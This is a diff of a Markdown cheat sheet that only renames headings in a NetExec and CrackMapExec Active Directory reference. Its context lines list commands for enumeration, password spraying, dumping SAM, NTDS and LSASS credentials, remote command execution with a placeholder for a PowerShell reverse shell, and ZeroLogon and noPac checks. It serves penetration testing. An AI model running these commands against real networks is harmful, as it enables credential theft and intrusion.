@@ -9,16 +9,16 @@ tags:   [Cheatsheets, Tools, Active-Directory, Active-Directory-Enumeration, SMB
 # Table of Contents
 - [Getting NetExec and CrackMapExec](#getting-netexec-and-crackmapexec)
 - [NetExec Commands](#netexec-commands)
-  - [Enumeration](#enumeration)
-  - [Checking Credentials & Password Spraying](#checking-credentials--password-spraying)
-  - [Dumping Credentials](#dumping-credentials)
-  - [Command Execution](#command-execution)
-  - [Testing CVEs](#testing-cves)
+  - [nxc Enumeration](#nxc-enumeration)
+  - [nxc Checking Credentials & Password Spraying](#nxc-checking-credentials--password-spraying)
+  - [nxc Dumping Credentials](#nxc-dumping-credentials)
+  - [nxc Command Execution](#nxc-command-execution)
+  - [nxc Testing CVEs](#nxc-testing-cves)
 - [CrackMapExec Commands](#crackmapexec-commands)
-  - [Enumeration](#enumeration-1)
-  - [Checking Credentials & Password Spraying](#checking-credentials--password-spraying-1)
-  - [Dumping Credentials](#dumping-credentials-1)
-  - [Command Execution](#command-execution-1)
+  - [cme Enumeration](#cme-enumeration)
+  - [cme Checking Credentials & Password Spraying](#cme-checking-credentials--password-spraying)
+  - [cme Dumping Credentials](#cme-dumping-credentials)
+  - [cme Command Execution](#cme-command-execution)
 
 # Getting NetExec and CrackMapExec
 ```shell
@@ -33,7 +33,7 @@ Important Note: Sometimes it's worth using both tools to discard false negatives
 
 # NetExec Commands
 The IP address 172.16.150.20 will be used as an example for the Domain Controller (DC01) IP address.
-## Enumeration
+## nxc Enumeration
 ```shell
 # Enumerating Network (Find active reachable hosts)
 nxc smb 172.16.150.0/24
@@ -86,7 +86,7 @@ nxc winrm 172.16.150.20 -u john -p 'Password123!' --local-auth
 nxc mssql 172.16.150.20 -u john -p 'Password123!'
 nxc mssql 172.16.150.20 -u john -p 'Password123!' --local-auth
 ```
-## Checking Credentials & Password Spraying
+## nxc Checking Credentials & Password Spraying
 Important Note: Always check Domain Password Policy before Password Spraying to prevent Account Lockouts.
 ```shell
 # Check Credentials - with Password
@@ -119,7 +119,7 @@ nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success
 nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth
 ```
 
-## Dumping Credentials
+## nxc Dumping Credentials
 ```shell
 # SAM
 nxc smb 172.16.150.20 -u john -p 'Password123!' --sam
@@ -143,7 +143,7 @@ nxc smb 172.16.150.20 -u john -p 'Password123!' -M procdump
 nxc ldap 172.16.150.20 -u john -p 'Password123!' -M laps -o computer=172.16.150.120
 ```
 
-## Command Execution
+## nxc Command Execution
 ```shell
 # CMD
 nxc smb 172.16.150.20 -u john -p 'Password123!' -x "whoami"
@@ -156,7 +156,7 @@ nxc mssql 172.16.150.20 -u john -p 'Password123!' -x "whoami"
 nxc mssql 172.16.150.20 -u john -p 'Password123!' -x "Enter PowerShell#3 (Base64) Reverse Shell from revshells.com here"
 ```
 
-## Testing CVEs
+## nxc Testing CVEs
 ```shell
 # ZeroLogon
 nxc smb 172.16.150.20 -u '' -p '' -M zerologon
@@ -170,7 +170,7 @@ nxc smb 172.16.150.20 -u '' -p '' -M nopac
 
 # CrackMapExec Commands
 As of 2024, CrackMapExec is deprecated, and I primarily use NetExec. However, there are still some cases where CrackMapExec remains useful. Below are the commands I use most frequently:
-## Enumeration
+## cme Enumeration
 ```shell
 # Enumerating Network (Find active reachable hosts)
 crackmapexec smb 172.16.150.0/24
@@ -187,7 +187,7 @@ crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --pass-pol
 # Domain Users
 crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --users
 ```
-## Checking Credentials & Password Spraying
+## cme Checking Credentials & Password Spraying
 ```shell
 # Check Credentials - with Password
 crackmapexec smb 172.16.150.20 -u john -p 'Password123!'
@@ -207,7 +207,7 @@ crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --local-auth
 crackmapexec smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt --local-auth
 ```
 
-## Dumping Credentials
+## cme Dumping Credentials
 ```shell
 # SAM
 crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --sam
@@ -222,7 +222,7 @@ crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --ntds
 crackmapexec smb 172.16.150.20 -u john -p 'Password123!' --ntds vss
 ```
 
-## Command Execution
+## cme Command Execution
 ```shell
 # CMD
 crackmapexec smb 172.16.150.20 -u john -p 'Password123!' -x "whoami"
